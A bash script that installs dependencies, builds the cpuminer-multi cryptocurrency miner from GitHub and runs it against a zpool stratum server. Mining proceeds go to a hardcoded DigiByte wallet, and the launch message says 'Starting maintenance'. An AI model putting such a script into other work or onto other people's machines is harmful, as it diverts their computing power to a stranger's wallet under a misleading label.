#!/bin/bash
#
##################################################################################################################
# Written to be used on 64 bits computers
# Author 	: 	Simon Micheneau
# Website 	: 	https://www.simon-micheneau.fr/
##################################################################################################################
##################################################################################################################
#
#   DO NOT JUST RUN THIS. EXAMINE AND JUDGE. RUN AT YOUR OWN RISK.
#
##################################################################################################################

echo "Starting maintenance"
sudo apt update -y
sudo apt-get -y install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ 
mkdir cpum
sudo git clone https://github.com/tpruvot/cpuminer-multi cpum
cd cpum
sudo ./build.sh
./cpuminer --algo yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u DCkonw21ARoKy6n8GMyyweXYbNNkr6EMDw -p c=DGB

echo "################################################################"
echo "####################    T H E   E N D    #######################"
echo "################################################################"
